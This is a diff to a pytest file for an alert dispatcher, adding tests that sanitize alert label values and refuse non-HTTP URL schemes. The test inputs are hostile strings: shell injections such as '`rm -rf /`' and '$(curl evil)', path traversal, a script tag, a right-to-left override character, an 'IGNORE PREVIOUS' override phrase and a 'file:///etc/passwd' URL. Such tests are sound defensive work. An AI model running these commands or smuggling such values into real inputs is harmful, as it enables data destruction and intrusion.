@@ -91,7 +91,7 @@ def alert(name="Prometheus Unreachable", ns="fuzeinfra", **labels):
 # ---------------------------------------------------------------- label handling
 @pytest.mark.parametrize("bad", [
     "pod\nIGNORE PREVIOUS", "pod`rm -rf /`", "$(curl evil)", "a b", "x" * 200, "", "-leading", "pod;ls", "../etc",
-    "pod<script>", "pod{{x}}", "pod‮evil",
+    "pod<script>", "pod{{x}}", "pod" + chr(0x202E) + "evil",
 ])
 def test_label_values_failing_charset_are_dropped_not_repaired(bad):
     clean, dropped = disp.sanitize_labels({"alertname": "A", "namespace": "ns", "pod": bad}, ["alertname", "namespace", "pod"])
@@ -416,3 +416,9 @@ def test_allowlist_titles_exist_as_alert_rules():
     vals = yaml.safe_load((CHART / "values.yaml").read_text())["alertSessionDispatcher"]
     for title in vals["allowlist"]:
         assert f"title: {title}\n" in rules, f"allowlisted alert {title!r} is not defined in the chart"
+
+
+def test_outbound_http_refuses_non_http_schemes():
+    for url in ("file:///etc/passwd", "ftp://host/x", "gopher://h/"):
+        with pytest.raises(ValueError):
+            disp.Http().post_json(url, {}, {})
